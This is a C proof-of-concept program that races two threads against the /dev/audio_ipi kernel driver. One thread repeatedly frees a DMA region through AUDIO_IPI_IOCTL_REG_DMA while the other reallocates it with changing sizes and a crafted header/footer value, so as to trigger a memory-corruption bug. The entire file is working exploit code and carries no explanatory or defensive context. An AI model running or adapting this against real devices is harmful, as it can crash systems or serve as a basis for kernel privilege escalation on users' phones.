#include "audio_ipi.h"
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>

int fd = -1;
struct audio_ipi_reg_dma_t* dma_regs = NULL;

void* myturn(void* arg) {
	dma_regs[1].reg_flag = 0;
	while(1) {
		ioctl(fd, AUDIO_IPI_IOCTL_REG_DMA, &dma_regs[1]);
	}
}

int main() {
	fd = open("/dev/audio_ipi", O_RDWR);
	dma_regs = calloc(2, sizeof(struct audio_ipi_reg_dma_t));
	for(size_t i = 0; i < 2; i++) {
		dma_regs[i].a2d_size = 125;
		dma_regs[i].d2a_size = 125;
		dma_regs[i].magic_footer = 32;
		dma_regs[i].magic_header = 0xFFFFFFFF - dma_regs->magic_footer;
	}
	pthread_t newthread;
	
	// First allocate a region
	dma_regs[0].reg_flag = 1;
	ioctl(fd, AUDIO_IPI_IOCTL_REG_DMA, &dma_regs[0]);

	pthread_create(&newthread, NULL, myturn, NULL);
	// allocate with different sizes while freeing thread so
	// region->size changes in value triggered bug
	while(1) {
		dma_regs[0].a2d_size *= 5;
		dma_regs[0].d2a_size *= 5;
		dma_regs[0].a2d_size %= 1000;
		dma_regs[0].d2a_size %= 1000;
		ioctl(fd, AUDIO_IPI_IOCTL_REG_DMA, &dma_regs[0]);		
	}
	//	sleep(3000);
	//}
	//close(fd);
}
